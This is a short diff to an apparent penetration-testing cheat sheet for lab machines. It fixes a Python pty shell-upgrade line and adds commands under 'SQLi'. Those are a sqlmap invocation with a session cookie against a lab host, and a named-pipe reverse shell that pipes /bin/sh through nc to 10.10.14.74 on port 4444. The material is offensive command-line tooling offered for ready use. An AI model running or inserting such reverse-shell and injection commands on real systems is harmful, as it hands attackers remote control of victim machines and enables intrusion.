@@ -131,7 +131,9 @@ PostEx
 
 Shell upgrade  
 `SHELL=/bin/bash script -q /dev/null`  
-`python3 -c "import pty; pty.spawn('/bin/bash')"  
+`python3 -c "import pty; pty.spawn('/bin/bash')"`  
 
 SQLi  
 `sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"`  
+`mkfifo 1474pipe`  
+`cat 1474pipe | /bin/sh | nc 10.10.14.74 4444 | tee f`  
